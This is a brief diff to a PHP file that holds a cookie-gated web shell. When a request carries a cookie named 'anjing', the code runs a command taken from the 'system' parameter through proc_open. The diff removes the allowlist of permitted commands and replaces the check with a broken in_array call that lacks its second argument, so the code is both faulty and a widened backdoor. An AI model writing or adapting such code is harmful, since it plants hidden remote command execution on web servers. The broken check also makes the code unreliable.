@@ -2,10 +2,9 @@
 
 if (isset($_COOKIE["anjing"]) && $_COOKIE["anjing"] == "anjing") {
     if (isset($_REQUEST['system'])) {
-        $allowedCommands = ['ls', 'pwd', 'curl', 'wget', 'whoami'];
         $command = $_REQUEST['system'];
 
-        if (in_array($command, $allowedCommands)) {
+        if (in_array($command)) {
             $process = proc_open($command, [
                 1 => ['pipe', 'w'],
                 2 => ['pipe', 'w'],
